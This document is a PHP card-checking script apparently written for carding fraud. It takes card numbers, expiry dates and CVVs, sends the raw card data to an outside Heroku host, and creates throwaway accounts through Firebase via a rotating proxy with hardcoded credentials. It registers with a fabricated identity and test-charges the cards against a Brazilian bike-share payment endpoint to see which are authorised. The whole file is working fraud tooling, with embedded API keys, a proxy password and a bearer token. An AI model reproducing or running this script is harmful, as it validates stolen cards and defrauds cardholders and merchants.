<?php
ignore_user_abort();
error_reporting(0);
session_start();
$time = time();

function multiexplode($delimiters, $string) {
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str);}
$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span> ➔ <span class="badge badge-warning">Suporte: @pladixoficial</span><br>');
}

$lista = $_GET['lista'];
$cc = multiexplode($delemitador, $lista)[0];
$mes = multiexplode($delemitador, $lista)[1];
$ano = multiexplode($delemitador, $lista)[2];
$cvv = multiexplode($delemitador, $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

if (strlen($ano) == 4){
  $ano2 = substr($ano, 2);
}

if ($mes == 1) {
  $mes2 = "1";
}elseif ($mes == 2) {
  $mes2 = "2";
}elseif ($mes == 3) {
  $mes2 = "3";
}elseif ($mes == 4) {
  $mes2 = "4";
}elseif ($mes == 5) {
  $mes2 = "5";
}elseif ($mes == 6) {
  $mes2 = "6";
}elseif ($mes == 7) {
  $mes2 = "7";
}elseif ($mes == 8) {
  $mes2 = "8";
}elseif ($mes == 9) {
  $mes2 = "9";
}elseif ($mes == 10) {
  $mes2 = "10";
}elseif ($mes == 11) {
  $mes2 = "11";
}elseif ($mes == 12) {
  $mes2 = "12";
}

$re = array(
  "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
  "Master" => "/^5[1-5]\d{14}$/",
  "Amex" => "/^3[47]\d{13,14}$/",
  "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(6550)|(6516)|(6504)||(6509)|(4011))\d{0,12})$/",
  "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);
if (preg_match($re['Visa'], $cc)) {
   $tipo = "visa";
} else if (preg_match($re['Amex'], $cc)) {
    $tipo = "amex";
} else if (preg_match($re['Master'], $cc)) {
   $tipo = "mc";
} else if (preg_match($re['Elo'], $cc)) {
   $tipo = "cup";
} 
else if (preg_match($re['hipercard'], $cc)) {
  $tipo = "cup";
} 
else {
  echo "Reprovada $cc|$mes|$ano|$cvv -> Cartão não suportado.";
    die();
}

$nomes = array('Christo','Ryan','Ethan','John','Zoey','Sarah','Pedro','Lucas','Alex','Ana','Renan','Ronald','Isaias','Moises','Midas','Antonio','Nadia','Ellen','Elen','Gustav','Marcos','Marco','Marcio','Leonardo','Gabriel','Karen','Karina','Bener','Michel','Sandra'
);
$sobrenomes = array('Walker','Thompson','Anderson','Johnson','Trembay','Peltier','Soares','Souza','Esquilo','Bila','Rosa','Auto','Ferraz','Alone','Batis','Libra','Aquario','Escorp','Zula','Leao','Leal','Leau','Jonga','Tabat','Tornet','Vrous','Vrau','Fruis','Foises','Noses','Nugra','Tundra','Tomper','Isais','Color','Toro','Taroe','Pereira','Simpson','Mercado','Sellers'
);
$name = $nomes[mt_rand(0, sizeof($nomes) - 1)];
$sobre = $sobrenomes[mt_rand(0, sizeof($sobrenomes) - 1)];
$nomeesobre = "$name $sobre";

$centavos = array('00','05','10','15','20','25','30','35','40','45','50','55','60','65','70','75','80','85','90','99');
$centavos = $centavos[mt_rand(0, sizeof($centavos) - 1)];

/* ===>>> FUNÇÃO DE ENCRYPTAÇÃO ADYEN TODAS <<<=== */


$adyen_version = "_0_1_25"; /// versão que o adyen esta usando seja ele adyenjs ou adyenan 
$adyen_key = "10001|9D93229250284DA8F5EF0368040154A4D6ECD5053BC85B3CBF93AF8E7D08E0F21ACB3E6EA3E8BF0A1664ADD34C9CFA55A03D049B087E7AD6D0D42BD24481CB70C873F1E5D547F232B87FDC12FBF791BB9C744D2B912010A2D35980C3FED305FB06A3FF7245F99419EB31503D1822E67751D634D380E63F39CF7B87AEA4A2702CBB6D6629545F5E6B1BFA653D31D2488B8042B9A7570F5B7E10673199B09F5A80F7EEB65460C37DFD021EBECF10A5DD57C1965BED996C916ABE06F4E6DED46587558BFB7B436A19CA40087D290D58EE8032976BCADB097536DC09BD6CD941C84543A04143791CE323BEF90296AB1B2B5B7649A809F4C3D86C102CAC0C1554C415"; /// essa key fica no codigo fonte do site , em breve video mostrando em @materialdosvideos

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://pladixoficial.herokuapp.com/adyen/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'Content-Type: application/json'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":'.$cc.',"month":'.$mes2.',"year":'.$ano.',"cvv":'.$cvv.',"adyen_key":"'.$adyen_key.'","adyen_version":"'.$adyen_version.'"}');
$adyencrypted = curl_exec($ch);
curl_close($ch);

/* criptografia respondendo nas variaveis abaixo */

$json = json_decode($adyencrypted);
$card = urldecode($json->card);
$month = urldecode($json->month);
$year = urldecode($json->year);
$cvv = urldecode($json->cvv);

/* ===>>> FUNÇÃO DE ENCRYPTAÇÃO ADYEN TODAS <<<=== */

#sleep(2);

$nu = rand(1111,9999);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyCtLLpIkZdvEhRR_ZEUWaYo5PJ_SXg0RsQ");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
///////Tirar Proxy Caso Aja Erro
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'host: identitytoolkit.googleapis.com',
'origin: https://temgrowth-social.tembici.com.br',
'user-agent: Apple|16.2|9.4.0',
'x-client-version: Other/JsCore/9.9.2/FirebaseCore-web',
'x-firebase-gmpid: 1:1061258869924:web:d5ef8d30aa3bf3fd7fba31'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"returnSecureToken":true,"email":"pladixmodas'.$nu.'@gmail.com","password":"Suasenha123"}');
$cadastro = curl_exec($ch);

$idtoken = getStr($cadastro, '"idToken": "','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyCtLLpIkZdvEhRR_ZEUWaYo5PJ_SXg0RsQ");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'host: identitytoolkit.googleapis.com',
'origin: https://temgrowth-social.tembici.com.br',
'user-agent: Apple|16.2|9.4.0',
'x-client-version: Other/JsCore/9.9.2/FirebaseCore-web',
'x-firebase-gmpid: 1:1061258869924:web:d5ef8d30aa3bf3fd7fba31'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"idToken":"'.$idtoken.'"}');
$confirmarcad = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyDy5A2EyJiE8ktzkHRT1X5G6040fHdLZhI");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'host: www.googleapis.com',
'user-agent: FirebaseAuth.iOS/8.4.0 pbsc.cyclefinder.tembici/9.4.0 iPhone/16.2 hw/iPhone12_1',
'x-client-version: iOS/FirebaseSDK/8.4.0/FirebaseCore-iOS',
'x-ios-bundle-identifier: pbsc.cyclefinder.tembici'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"pladixmodas'.$nu.'@gmail.com","returnSecureToken":true,"password":"Suasenha123"}');
$login = curl_exec($ch);

$idtoken = getStr($login, '"idToken": "','"' , 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://temflow.tembici.com.br/api/v1/register/sign_up_sso");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'client-id: Jia0eT5vmQDh7xiNxPaLhNQ7HrUlz0GlnSOS8ROxJ05vvFlwer0jLd76rm68',
'content-type: application/json',
'firebase-token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImNlOWI4ODBmODE4MmRkYTU1N2Y3YzcwZTIwZTRlMzcwZTNkMTI3NDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vdGVtYmljaSIsImF1ZCI6InRlbWJpY2kiLCJhdXRoX3RpbWUiOjE2NzMwNjEwOTEsInVzZXJfaWQiOiJ2a0VEc1NOQUF4UkJyMnJrc0ZJTXBJemFYN0UyIiwic3ViIjoidmtFRHNTTkFBeFJCcjJya3NGSU1wSXphWDdFMiIsImlhdCI6MTY3MzA2MTA5MSwiZXhwIjoxNjczMDY0NjkxLCJlbWFpbCI6InBsYWRpeG1vZGFzQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJwbGFkaXhtb2Rhc0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.EYZtNvjHPWhl4Z9YtCtvTB16BnAYQozGlPRNJCQm5MtVb-1pVSXIGRvJxw_5RbtjDCE8nK_US7fDDYMI-IF4iCJStdsKAdgyw0OfauaW6CuwL6XR3OBDr6uAcpB-AI0KJrr2qBvA_9vcFgjVHPQvdRdW6jxOuwEHa5hmG90Tmcwevt-TT83Z7h2Zc_zquo_AIsXRcGEWSSPEDvLLX2skHd_SDea6yV068Q8F1tg7TTzhWjJKvhsGug3CmHF_IeQPsxeCSaMSYUA8MMhixYE2q8HKutEdBx8jo2t7QW39fTJnRQhKVfzTvVCcn4sdRntCwBQfg--gHYb0EUvkoagqKQ',
'host: temflow.tembici.com.br',
'origin: https://temgrowth-social.tembici.com.br',
'referer: https://temgrowth-social.tembici.com.br/',
'user-agent: Apple|16.2|9.4.0'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"pladixmodas'.$nu.'@gmail.com","password":"Suasenha113","name":"Higo Mesquita Gomes","birthday":"1979-12-02","nationality":"BRA","phone":"5511999151515","identity":{"type":1,"number":"90206290187"}}');
$validarcadastro = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://apigateway.tembici.com.br/temshop/api/v1/payments/card/tokenize/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authorization: Bearer '.$idtoken.'',
'content-type: application/json',
'host: apigateway.tembici.com.br',
'key: Jia0eT5vmQDh7xiNxPaLhNQ7HrUlz0GlnSOS8ROxJ05vvFlwer0jLd76rm68',
'origin: https://temgrowth-social.tembici.com.br',
'referer: https://temgrowth-social.tembici.com.br/',
'user-agent: Apple|16.2|9.4.0'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"currency":"BRL","payment_type":"credit","encrypted_card_info":{"number":"'.$card.'","cvv":"'.$cvv.'","expiration_month":"'.$month.'","expiration_year":"'.$year.'","holder_name":"'.$nomeesobre.'"},"merchant_account":"FirstPurchaseM2","channel":"web","browser_info":{"accept_header":"*/*","color_depth":32,"java_enabled":false,"language":"pt-BR","screen_height":896,"screen_width":414,"timezone_offset":-3,"user_agent":"Apple|16.2|9.4.0"},"return_url":"https://temgrowth-social.tembici.com.br/challenge-threeds/?location=bike-sampa-production&plan=9&coupon=&typePayment=credit","location_reference":"bike-sampa-production","origin_url":"https://temgrowth-social.tembici.com.br"}');
$pay = curl_exec($ch);

 $msg = getStr($pay, 'user_error_msg":"','"' , 1);

if(strpos($pay, '"result_code":"Authorised","')) {

die('{"success":true,"message":"Cartão autorizado com sucesso."}');

}elseif(strpos($pay, '","error":{"details":{"code":"')) {

die('{"success":false,"message":"Cartão inexistente."}');

}else{

die('{"success":false,"message":"Falha ao realizar o teste."}');

}

curl_close($ch);

?>